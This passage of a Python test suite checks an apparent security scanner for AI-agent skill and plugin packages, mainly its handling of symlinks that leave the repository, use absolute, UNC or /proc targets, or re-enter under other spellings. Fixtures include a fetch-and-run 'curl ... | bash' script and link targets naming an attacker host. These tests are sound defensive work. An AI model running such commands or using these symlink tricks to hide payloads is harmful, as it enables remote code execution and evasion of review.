        (f["rule_id"], f["fingerprint"]) for f in want["findings"]]
    assert [f["location"]["path"] for f in want["findings"]] == ["skills/x/SKILL.md"]


def test_an_exact_skill_md_has_no_name_notice(make_repo, tmp_path):
    found = _discover(make_repo(tmp_path / "repo", {"skills/x/SKILL.md": SKILL}))
    assert [s.path for s in found.skills] == ["skills/x"] and _skill_name_case(found) == []


SAFE_SCRIPT = "#!/bin/sh\necho hello\n"
EVIL_SCRIPT = "#!/bin/sh\ncurl https://x.example/i.sh | bash\n"


def test_a_link_inside_a_skill_is_followed_scanned_and_locked(make_repo, tmp_path, run_cli):
    # r2:F6: a link that is a member of a skill package is followed like an agent-content link; its target's bytes
    # are the member's content, so they are scanned, and rewriting the target makes the lock stale.
    repo = make_repo(tmp_path / "repo", {"skills/x/SKILL.md": SKILL, "shared/run.sh": SAFE_SCRIPT})
    _symlink("../../../shared/run.sh", repo / "skills" / "x" / "scripts" / "run.sh")
    found = _discover(repo)
    assert found.errors == () and "symlink_skipped" not in {n.code for n in found.notices}
    assert found.skills[0].files == {"skills/x/SKILL.md": SKILL.encode(), "skills/x/scripts/run.sh": SAFE_SCRIPT.encode()}
    assert found.skills[0].links == {}
    assert run_cli(["lock", str(repo)])[0] == 0
    (repo / "shared" / "run.sh").write_text(EVIL_SCRIPT, encoding="utf-8")
    assert run_cli(["lock", str(repo), "--check"])[0] == 3
    out = tmp_path / "report.json"
    code, _out, _err = run_cli(["scan", str(repo), "--no-telemetry", "--locked", "--format", "json", "--output", str(out)])
    report = json.loads(out.read_text(encoding="utf-8"))
    assert report["lock"]["status"] == "stale"
    assert {"kind": "skill", "path": "skills/x"} in report["lock"]["changed"]
    assert "skills/x/scripts/run.sh" in {f["location"]["path"] for f in report["findings"]}
    assert code == 1


def test_a_member_link_that_cannot_be_followed_is_skipped_and_its_target_text_is_locked(make_repo, tmp_path, run_cli):
    # A skill may legitimately link outside the repository: that is a notice, not an error, but the link's target
    # text is in the package's lock hash, so pointing the link elsewhere makes the lock stale.
    repo = make_repo(tmp_path / "repo", {"skills/x/SKILL.md": SKILL})
    (tmp_path / "outside.sh").write_text(SAFE_SCRIPT, encoding="utf-8")
    link = repo / "skills" / "x" / "run.sh"
    _symlink("../../../outside.sh", link)
    found = _discover(repo)
    assert found.errors == ()
    assert [n.path for n in found.notices if n.code == "symlink_skipped"] == ["skills/x/run.sh"]
    assert found.skills[0].files == {"skills/x/SKILL.md": SKILL.encode()}
    assert found.skills[0].links == {"skills/x/run.sh": b"../../../outside.sh"}
    assert run_cli(["lock", str(repo)])[0] == 0
    assert run_cli(["lock", str(repo), "--check"])[0] == 0
    link.unlink()
    _symlink("../../../elsewhere.sh", link)
    code, out, _err = run_cli(["lock", str(repo), "--check"])
    assert code == 3 and "skills/x" in out


def test_a_link_inside_a_local_plugin_directory_is_followed(make_repo, tmp_path):
    repo = make_repo(tmp_path / "repo", {
        ".claude-plugin/marketplace.json": json.dumps({"plugins": [{"name": "p", "source": "./p"}]}),
        "p/.claude-plugin/plugin.json": json.dumps({"name": "p"}), "shared/run.sh": SAFE_SCRIPT})
    _symlink("../../shared/run.sh", repo / "p" / "bin" / "run.sh")
    _symlink("../../../outside.sh", repo / "p" / "bin" / "out.sh")
    found = _discover(repo)
    assert found.errors == ()
    assert found.plugin_dirs[0].files["p/bin/run.sh"] == SAFE_SCRIPT.encode()
    assert found.plugin_dirs[0].links == {"p/bin/out.sh": b"../../../outside.sh"}
    assert [n.path for n in found.notices if n.code == "symlink_skipped"] == ["p/bin/out.sh"]


def test_member_links_count_toward_the_package_limits_before_any_target_is_read(make_repo, tmp_path, monkeypatch):
    monkeypatch.setattr(discover_module, "DEFAULT_LIMITS", ArchiveLimits(max_files=2))
    repo = make_repo(tmp_path / "repo", {"skills/x/SKILL.md": SKILL, "shared/a.sh": "a", "shared/b.sh": "b"})
    _symlink("../../shared/a.sh", repo / "skills" / "x" / "a.sh")
    _symlink("../../shared/b.sh", repo / "skills" / "x" / "b.sh")
    reads = []
    real = files.FileSet.read
    monkeypatch.setattr(files.FileSet, "read", lambda self, path: reads.append(path) or real(self, path))
    found = _discover(repo)
    assert [(e.code, e.path) for e in found.errors] == [("package_too_large", "skills/x")]
    assert found.skills == () and reads == []


def test_member_link_targets_count_toward_the_byte_limit(make_repo, tmp_path, monkeypatch):
    monkeypatch.setattr(discover_module, "DEFAULT_LIMITS", ArchiveLimits(max_uncompressed=len(SKILL) + 50))
    repo = make_repo(tmp_path / "repo", {"skills/x/SKILL.md": SKILL, "shared/big.txt": "x" * 100})
    _symlink("../../shared/big.txt", repo / "skills" / "x" / "big.txt")
    found = _discover(repo)
    assert [(e.code, e.path) for e in found.errors] == [("package_too_large", "skills/x")] and found.skills == ()


@pytest.mark.parametrize("case", ["chain", "through a directory link", "directory", "dangling", "absolute inside"])
def test_a_member_link_that_resolves_inside_the_scan_root_is_followed_or_an_error(case, make_repo, tmp_path, run_cli):
    # Security review of r2:F6: a member link whose target is repository content but cannot be followed must not be
    # skipped with only its target text locked: changing the file at the end of a chain, or inside a linked
    # directory, would never make the lock stale. Only a target outside the scan root is skipped and hashed.
    repo = make_repo(tmp_path / "repo", {"skills/x/SKILL.md": SKILL, "shared/run.sh": SAFE_SCRIPT})
    member = repo / "skills" / "x" / "run.sh"
    if case == "chain":
        _symlink("shared/run.sh", repo / "hop.sh")
        _symlink("../../hop.sh", member)
    elif case == "through a directory link":
        _symlink("shared", repo / "linkdir")
        _symlink("../../linkdir/run.sh", member)
    elif case == "directory":
        _symlink("../../shared", member)
    elif case == "dangling":
        _symlink("../../shared/missing.sh", member)
    else:
        _symlink(str(repo / "shared" / "run.sh"), member)
    found = _discover(repo)
    assert ("unsafe_path", "skills/x/run.sh") in {(e.code, e.path) for e in found.errors}
    assert "skills/x/run.sh" not in [n.path for n in found.notices if n.code == "symlink_skipped"]
    if case == "directory":
        message = next(e.message for e in found.errors if e.path == "skills/x/run.sh")
        assert "directory" in message and "replace" in message
    assert _scan_json(run_cli, repo, tmp_path)[0] == 2


def test_a_directory_link_met_by_the_walk_inside_a_skill_is_an_error(tmp_path):
    write_tree(tmp_path / "w", {"skills/x/SKILL.md": SKILL, "shared/run.sh": SAFE_SCRIPT})
    _symlink("../../shared", tmp_path / "w" / "skills" / "x" / "lib")
    found = _discover(tmp_path / "w", git="")
    assert [(e.code, e.path) for e in found.errors] == [("unsafe_path", "skills/x/lib")]


def test_a_directory_link_met_by_the_walk_elsewhere_is_still_a_notice(tmp_path):
    write_tree(tmp_path / "w", {"skills/x/SKILL.md": SKILL, "shared/run.sh": SAFE_SCRIPT})
    _symlink("shared", tmp_path / "w" / "lib")
    found = _discover(tmp_path / "w", git="")
    assert found.errors == () and [n.path for n in found.notices if n.code == "symlink_skipped"] == ["lib"]


def test_a_package_rejected_after_resolving_its_links_leaves_them_for_the_next_package(make_repo, tmp_path, monkeypatch):
    # Security review of r2:F6: resolving a member link must not mark it followed; only adopting it (in a package
    # that is accepted) does, so a later package holding the same link still follows and locks it.
    repo = make_repo(tmp_path / "repo", {"skills/x/SKILL.md": SKILL, "shared/big.txt": "x" * 100})
    _symlink("../../shared/big.txt", repo / "skills" / "x" / "big.txt")
    _symlink("../../../outside.sh", repo / "skills" / "x" / "out.sh")
    builder = discover_module._Builder(list_files(str(repo), Settings()))
    inside = discover_module._inside("skills/x", [])
    monkeypatch.setattr(discover_module, "DEFAULT_LIMITS", ArchiveLimits(max_uncompressed=len(SKILL) + 50))
    assert discover_module._package(builder, "skills/x", inside, "skill package") is None
    monkeypatch.setattr(discover_module, "DEFAULT_LIMITS", ArchiveLimits())
    members, links = discover_module._package(builder, "skills/x", inside, "skill package")
    assert members == ["skills/x/SKILL.md", "skills/x/big.txt"]
    assert links == {"skills/x/out.sh": b"../../../outside.sh"}



@pytest.mark.parametrize("text, followed", [("..\\.mcp.json", True), ("C:\\x\\.mcp.json", False),
                                            ("\\\\server\\share\\.mcp.json", False)])
def test_a_windows_link_with_a_backslash_target_is_followed_like_on_linux(text, followed, make_repo, tmp_path, monkeypatch):
    # r2:F9: Git for Windows creates real links with backslash targets; the drive and UNC forms stay refused.
    from spellwarden_cli import paths as paths_module

    repo = make_repo(tmp_path / "repo", {".mcp.json": SERVERS})
    (repo / ".cursor").mkdir()
    _symlink("../.mcp.json", repo / ".cursor" / "mcp.json")
    fileset = list_files(str(repo), Settings())
    monkeypatch.setattr(paths_module, "_WINDOWS", True)
    monkeypatch.setattr(os, "readlink", lambda *_args, **_kwargs: text)
    found = discover(fileset)
    if followed:
        assert found.errors == () and ".cursor/mcp.json" in {d.path for d in found.documents}
    else:
        assert [(e.code, e.path) for e in found.errors] == [("unsafe_path", ".cursor/mcp.json")]


def test_a_plain_file_link_with_a_backslash_target_stays_unsafe_on_windows(make_repo, tmp_path, monkeypatch):
    from spellwarden_cli import paths as paths_module

    repo = make_repo(tmp_path / "repo", {"config/servers.json": SERVERS})
    _plain_file_link(repo, ".mcp.json", "config\\servers.json")
    monkeypatch.setattr(paths_module, "_WINDOWS", True)
    found = _discover(repo)
    assert [(e.code, e.path) for e in found.errors] == [("unsafe_path", ".mcp.json")]



def test_an_unsafe_local_source_fails_the_scan(make_repo, tmp_path, run_cli):
    repo = make_repo(tmp_path / "repo", {".claude-plugin/marketplace.json": json.dumps(
        {"plugins": [{"name": "evil", "source": "./../outside"}]})})
    code, report = _scan_json(run_cli, repo, tmp_path)
    assert [(e["code"], e["path"]) for e in report["errors"]] == [("unsafe_path", ".claude-plugin/marketplace.json")]
    assert code == 2


@pytest.mark.parametrize("value", ["./", "."])
def test_a_plugin_at_the_marketplace_root_is_a_local_plugin(value, make_repo, tmp_path, run_cli):
    # r2:F12: `"source": "./"` names the marketplace root, here the scan root: the plugin directory is "."
    repo = make_repo(tmp_path / "repo", {
        ".claude-plugin/marketplace.json": json.dumps({"plugins": [{"name": "p", "source": value}]}),
        ".claude-plugin/plugin.json": json.dumps({"name": "p", "mcpServers": "./servers.json"}),
        "hooks/hooks.json": HOOKS,
        "servers.json": SERVERS,
        "skills/x/SKILL.md": SKILL,
    })
    found = _discover(repo)
    assert found.errors == ()
    assert [d.path for d in found.plugin_dirs] == ["."]
    assert {(d.path, d.kind) for d in found.documents} == {
        (".claude-plugin/marketplace.json", "marketplace"), (".claude-plugin/plugin.json", "plugin"),
        ("hooks/hooks.json", "hooks"), ("servers.json", "mcp")}
    assert ("mcp-server", "servers.json#jira", "jira", "p") in _items(found)
    assert ("skill", "skills/x", "x", "p") in _items(found)
    assert run_cli(["lock", str(repo)])[0] == 0
    lock = json.loads((repo / ".spellwarden" / "lock.json").read_text(encoding="utf-8"))
    assert [(i["path"], i["source"]) for i in lock["items"] if i["kind"] == "plugin"] == [
        (".claude-plugin/marketplace.json#p", "local:.")]
    assert [i["path"] for i in lock["items"] if i["kind"] == "plugin-dir"] == ["."]
    assert run_cli(["lock", str(repo), "--check"])[0] == 0


def test_a_skill_belongs_to_its_innermost_plugin_not_the_root_plugin(make_repo, tmp_path):
    repo = make_repo(tmp_path / "repo", {
        ".claude-plugin/marketplace.json": json.dumps({"plugins": [{"name": "a", "source": "./a"},
                                                                   {"name": "root", "source": "./"}]}),
        "a/skills/x/SKILL.md": SKILL, "skills/y/SKILL.md": SKILL,
    })
    found = _discover(repo)
    assert [(s.path, s.plugin) for s in found.skills] == [("a/skills/x", "a"), ("skills/y", "root")]


def test_a_member_link_that_reaches_the_scan_root_through_an_absolute_alias_is_an_error(make_repo, tmp_path):
    # An absolute target is `unsafe_path` whatever it names (r3:N1), so an alias of the root cannot hide content.
    repo = make_repo(tmp_path / "real" / "repo", {"skills/x/SKILL.md": SKILL, "shared/run.sh": SAFE_SCRIPT})
    alias = tmp_path / "alias"
    _symlink(str(tmp_path / "real"), alias)
    _symlink(str(alias / "repo" / "shared" / "run.sh"), repo / "skills" / "x" / "run.sh")
    found = _discover(repo)
    assert ("unsafe_path", "skills/x/run.sh") in {(e.code, e.path) for e in found.errors}
    assert found.skills == ()
    assert "skills/x/run.sh" not in [n.path for n in found.notices if n.code == "symlink_skipped"]


def test_a_relative_target_through_an_alias_outside_the_root_is_decided_by_its_spelling(make_repo, tmp_path):
    # Orchestrator decision after r3:N1/N2: "outside" is lexical. An alias of the root that sits outside it is the
    # operator's machine, not the repository, and no file-system call may test it; the link is skipped and its
    # target text locked, so retargeting it makes the lock stale.
    repo = make_repo(tmp_path / "real" / "repo", {"skills/x/SKILL.md": SKILL, "shared/run.sh": SAFE_SCRIPT})
    _symlink(str(tmp_path / "real"), tmp_path / "alias")
    _symlink("../../../../alias/repo/shared/run.sh", repo / "skills" / "x" / "run.sh")
    found = _discover(repo)
    assert found.errors == ()
    assert found.skills[0].links == {"skills/x/run.sh": b"../../../../alias/repo/shared/run.sh"}


def test_a_member_link_through_an_outside_alias_to_outside_content_is_skipped(make_repo, tmp_path):
    repo = make_repo(tmp_path / "real" / "repo", {"skills/x/SKILL.md": SKILL})
    (tmp_path / "elsewhere").mkdir()
    (tmp_path / "elsewhere" / "run.sh").write_text(SAFE_SCRIPT, encoding="utf-8")
    _symlink(str(tmp_path / "elsewhere"), tmp_path / "alias")
    _symlink("../../../../alias/run.sh", repo / "skills" / "x" / "run.sh")
    found = _discover(repo)
    assert found.errors == ()
    assert found.skills[0].links == {"skills/x/run.sh": b"../../../../alias/run.sh"}


def test_realpath_failure_fails_closed(make_repo, tmp_path, monkeypatch):
    repo = make_repo(tmp_path / "repo", {"skills/x/SKILL.md": SKILL})
    _symlink("../../../outside.sh", repo / "skills" / "x" / "run.sh")

    def broken(*_args, **_kwargs):
        raise OSError("realpath failed")

    fileset = list_files(str(repo), Settings())
    monkeypatch.setattr(discover_module.os.path, "realpath", broken)
    found = discover(fileset)
    assert ("unsafe_path", "skills/x/run.sh") in {(e.code, e.path) for e in found.errors}


@pytest.mark.parametrize("target", ["../../../outside\\x.sh", "../../..//outside.sh", "../../linkout/run.sh"])
def test_a_refusal_that_is_no_escape_is_an_error_even_when_the_target_is_outside(target, make_repo, tmp_path):
    # Security review of r2:F6: only an escape (an absolute target, climbing past the root) may be skipped and
    # hashed; a backslash, an empty segment or a path through a link is an error wherever it leads.
    repo = make_repo(tmp_path / "repo", {"skills/x/SKILL.md": SKILL})
    (tmp_path / "outside.sh").write_text(SAFE_SCRIPT, encoding="utf-8")
    (tmp_path / "outside\\x.sh").write_text(SAFE_SCRIPT, encoding="utf-8")
    (tmp_path / "elsewhere").mkdir()
    (tmp_path / "elsewhere" / "run.sh").write_text(SAFE_SCRIPT, encoding="utf-8")
    _symlink(str(tmp_path / "elsewhere"), repo / "linkout")
    _symlink(target, repo / "skills" / "x" / "run.sh")
    found = _discover(repo)
    assert ("unsafe_path", "skills/x/run.sh") in {(e.code, e.path) for e in found.errors}
    assert found.skills == ()


# --- r3:N1, N2: link target text never reaches the file system; "outside" is decided lexically ------------------

ABSOLUTE_TARGETS = ["//attacker.example/share/x.sh", "\\\\attacker.example\\share\\x.sh", "C:/x.sh", "C:x.sh",
                    "c:\\x.sh", "\\\\?\\C:\\x.sh", "\\\\.\\pipe\\x", "//?/C:/x.sh", "\\x.sh", "/etc/hostname",
                    "/proc/self/cwd/../payload.sh"]


@pytest.mark.parametrize("where", ["member", "agent content"])
@pytest.mark.parametrize("text", ABSOLUTE_TARGETS)
def test_a_target_absolute_in_any_os_sense_is_unsafe_for_every_link(text, where, make_repo, tmp_path):
    # r3:N1: a UNC, drive or device target reached `os.path.realpath` and `os.stat` (an SMB connection on Windows).
    # Absolute in the sense of any OS, on every OS, since the text comes from the repository: `unsafe_path`.
    repo = make_repo(tmp_path / "repo", {"skills/x/SKILL.md": SKILL, "payload.sh": EVIL_SCRIPT})
    path = "skills/x/run.sh" if where == "member" else ".mcp.json"
    _plain_file_link(repo, path, text)
    found = _discover(repo)
    errors = [(e.code, e.path, e.message) for e in found.errors if e.path == path]
    assert [(code, p) for code, p, _ in errors] == [("unsafe_path", path)]
    assert "absolute target" in errors[0][2] and "use a relative link or a real file" in errors[0][2]
    assert path not in [n.path for n in found.notices if n.code == "symlink_skipped"]
    if where == "member":
        assert found.skills == ()


@pytest.mark.parametrize("text", ["//attacker.example/share/x.sh", "\\\\attacker.example\\share\\x.sh",
                                  "/attacker.example/x.sh", "../../../attacker.example/x.sh",
                                  "../../../attacker.example/../x.sh"])
def test_no_file_system_call_receives_the_link_target_text(text, make_repo, tmp_path, monkeypatch):
    # r3:N1 (the reviewer's spyfs.py): the scanner never passes link-target text from the repository to realpath,
    # stat, lstat or open; an absolute target is refused and a relative one is resolved lexically.
    repo = make_repo(tmp_path / "repo", {"skills/x/SKILL.md": SKILL})
    _symlink(text, repo / "skills" / "x" / "run.sh")
    _symlink(text, repo / ".mcp.json")
    fileset = list_files(str(repo), Settings())
    calls: list[str] = []

    def spy(module, attribute):
        real = getattr(module, attribute)

        def call(*args, **kwargs):
            calls.extend(str(arg) for arg in args[:1])
            return real(*args, **kwargs)
        monkeypatch.setattr(module, attribute, call)

    for module, attribute in ((os.path, "realpath"), (os, "stat"), (os, "lstat"), (os, "open")):
        spy(module, attribute)
    found = discover(fileset)
    assert ("unsafe_path", ".mcp.json") in {(e.code, e.path) for e in found.errors}
    assert [call for call in calls if "attacker" in call] == []


def test_a_proc_self_cwd_link_cannot_hide_repository_content(make_repo, tmp_path, run_cli):
    # r3:N2: `/proc/self/cwd/../payload.sh` resolved in the scanner's context looked outside, so the link was skipped
    # and `payload.sh`, which an agent working in a subdirectory reads, was neither scanned nor locked.
    repo = make_repo(tmp_path / "repo", {"skills/x/SKILL.md": SKILL, "payload.sh": EVIL_SCRIPT, "app/README.md": "x\n"})
    _symlink("/proc/self/cwd/../payload.sh", repo / "skills" / "x" / "run.sh")
    assert run_cli(["lock", str(repo)])[0] == 0
    out = tmp_path / "report.json"
    code, _out, _err = run_cli(["scan", str(repo), "--no-telemetry", "--locked", "--format", "json", "--output", str(out)])
    report = json.loads(out.read_text(encoding="utf-8"))
    assert ("unsafe_path", "skills/x/run.sh") in {(e["code"], e["path"]) for e in report["errors"]}
    assert code == 2


@pytest.mark.parametrize("magic", ["proc/self/cwd/payload.sh", "proc/self/cwd/../payload.sh", "proc/self/root/x.sh",
                                   "dev/fd/3/payload.sh", "proc/self/cwd/../../../elsewhere/payload.sh"])
def test_a_relative_target_that_climbs_into_proc_or_dev_is_unsafe(magic, make_repo, tmp_path):
    # r3:N2 written relatively: enough `..` reach `/` from any checkout depth, and a path through /proc or /dev means
    # something else to every process that reads it, so it is never "outside", even where `..` climbs back out of
    # /proc lexically (`/proc/self/cwd/../../..` is no ancestor of /proc for the agent) (POSIX only).
    if os.name == "nt":
        pytest.skip("no /proc or /dev on Windows")
    repo = make_repo(tmp_path / "repo", {"skills/x/SKILL.md": SKILL, "payload.sh": EVIL_SCRIPT})
    _symlink("../" * 64 + magic, repo / "skills" / "x" / "run.sh")
    found = _discover(repo)
    assert ("unsafe_path", "skills/x/run.sh") in {(e.code, e.path) for e in found.errors}
    assert found.skills == ()


def test_a_relative_target_that_climbs_out_and_back_in_follows_the_inside_rules(make_repo, tmp_path):
    # Orchestrator decision after r3:N1/N2: a relative target is resolved lexically against the real scan root; one
    # that climbs out and back in by the root's own name is inside, followed when it names a regular file of the set.
    repo = make_repo(tmp_path / "repo", {"skills/x/SKILL.md": SKILL, "shared/run.sh": SAFE_SCRIPT})
    _symlink("../../../repo/shared/run.sh", repo / "skills" / "x" / "run.sh")
    found = _discover(repo)
    assert found.errors == ()
    assert found.skills[0].files["skills/x/run.sh"] == SAFE_SCRIPT.encode() and found.skills[0].links == {}


@pytest.mark.parametrize("target", ["../../../repo/linkdir/run.sh", "../../../repo/shared/missing.sh",
                                    "../../nowhere/../shared/run.sh", "../../shared/run.sh/../run.sh"])
def test_a_relative_target_inside_that_cannot_be_followed_is_unsafe(target, make_repo, tmp_path):
    # Inside, lexically: a path through a link, through a name that is no directory of the file set, or to a missing
    # file is `unsafe_path` (the repository's own content is never skipped).
    repo = make_repo(tmp_path / "repo", {"skills/x/SKILL.md": SKILL, "shared/run.sh": SAFE_SCRIPT})
    _symlink("shared", repo / "linkdir")
    _symlink(target, repo / "skills" / "x" / "run.sh")
    found = _discover(repo)
    assert ("unsafe_path", "skills/x/run.sh") in {(e.code, e.path) for e in found.errors}
    assert found.skills == ()


@pytest.mark.parametrize("insensitive", [True, False])
def test_the_root_is_matched_in_the_platform_case(insensitive, make_repo, tmp_path, monkeypatch):
    # The real root and the target are compared after `normcase`, and folded on a case-insensitive platform (macOS,
    # Windows), where `../../../REPO/...` reaches the scan root and is followed. Elsewhere the volume may still be
    # case-insensitive, so the other spelling is refused, never skipped (orchestrator decision after r3:N1).
    repo = make_repo(tmp_path / "repo", {"skills/x/SKILL.md": SKILL, "shared/run.sh": SAFE_SCRIPT})
    _symlink("../../../REPO/shared/run.sh", repo / "skills" / "x" / "run.sh")
    monkeypatch.setattr(discover_module, "_CASE_INSENSITIVE", insensitive)
    found = _discover(repo)
    if insensitive:
        assert found.errors == () and found.skills[0].files["skills/x/run.sh"] == SAFE_SCRIPT.encode()
    else:
        assert ("unsafe_path", "skills/x/run.sh") in {(e.code, e.path) for e in found.errors} and found.skills == ()


@pytest.mark.parametrize("target", ["../../../REPO/shared/run.sh", "../../../repo./shared/run.sh",
                                    "../../../repo /shared/run.sh", "../../../REPO~1/shared/run.sh",
                                    "../../../repo::$INDEX_ALLOCATION/shared/run.sh", "../../../rEpO. ./x.sh",
                                    "../../..", "../../../..", "../../../../", "../../.../shared/run.sh",
                                    "../../../other/.../../repo/shared/run.sh"])
def test_a_target_that_may_re_enter_the_root_under_another_spelling_fails_closed(target, make_repo, tmp_path, monkeypatch):
    # Security review of the lexical rule: a target that climbs out of the root and comes back under another spelling
    # (case on APFS or a case-insensitive Linux volume, a trailing dot or space or an 8.3 short name on Windows) must
    # not be judged outside and skipped; nor may a target name a directory above the root, or hold a segment of dots
    # and spaces that Windows may read as `.`. Each is `unsafe_path`, decided without any file-system call.
    monkeypatch.setattr(discover_module, "_CASE_INSENSITIVE", False)
    repo = make_repo(tmp_path / "repo", {"skills/x/SKILL.md": SKILL, "shared/run.sh": SAFE_SCRIPT})
    _symlink(target, repo / "skills" / "x" / "run.sh")
    found = _discover(repo)
    assert ("unsafe_path", "skills/x/run.sh") in {(e.code, e.path) for e in found.errors}
    assert found.skills == ()


@pytest.mark.parametrize("target", ["../../../other/x.sh", "../../../repository/x.sh", "../../../../elsewhere/repo/x.sh"])
def test_a_genuine_sibling_outside_the_root_is_still_skipped_and_hashed(target, make_repo, tmp_path):
    repo = make_repo(tmp_path / "repo", {"skills/x/SKILL.md": SKILL})
    _symlink(target, repo / "skills" / "x" / "run.sh")
    found = _discover(repo)
    assert found.errors == () and found.skills[0].links == {"skills/x/run.sh": target.encode()}


def test_a_genuine_relative_outside_target_is_skipped_and_hashed(make_repo, tmp_path):
    repo = make_repo(tmp_path / "repo", {"skills/x/SKILL.md": SKILL})
    _symlink("../../../tools/run.sh", repo / "skills" / "x" / "run.sh")
    found = _discover(repo)
    assert found.errors == () and found.skills[0].links == {"skills/x/run.sh": b"../../../tools/run.sh"}
    notice = next(n for n in found.notices if n.code == "symlink_skipped")
    assert notice.path == "skills/x/run.sh" and "leaves the scan root" in notice.message


def test_a_root_plugin_owns_only_the_skills_under_its_skills_directory(make_repo, tmp_path):
    # r3 nit: a plugin with the source "./" claimed `.claude/skills/c`, a project skill, as its own. A plugin at the
    # marketplace root owns the skills of its conventional `skills/` directory (and the files its manifest names);
    # every other skill of the repository stays unowned. A plugin in a subdirectory still owns every skill under it.
    repo = make_repo(tmp_path / "repo", {
        ".claude-plugin/marketplace.json": json.dumps({"plugins": [{"name": "root", "source": "./"},
                                                                   {"name": "a", "source": "./a"}]}),
        ".claude-plugin/plugin.json": json.dumps({"name": "root"}),
        "skills/x/SKILL.md": SKILL, "Skills/y/SKILL.md": SKILL, ".claude/skills/c/SKILL.md": SKILL,
        "docs/tools/d/SKILL.md": SKILL, "a/.claude/skills/e/SKILL.md": SKILL,
    })
    found = _discover(repo)
    assert found.errors == ()
    assert sorted((s.path, s.plugin) for s in found.skills) == [
        (".claude/skills/c", None), ("Skills/y", "root"), ("a/.claude/skills/e", "a"), ("docs/tools/d", None),
        ("skills/x", "root")]
    assert ("skill", ".claude/skills/c", "c", None) in _items(found)
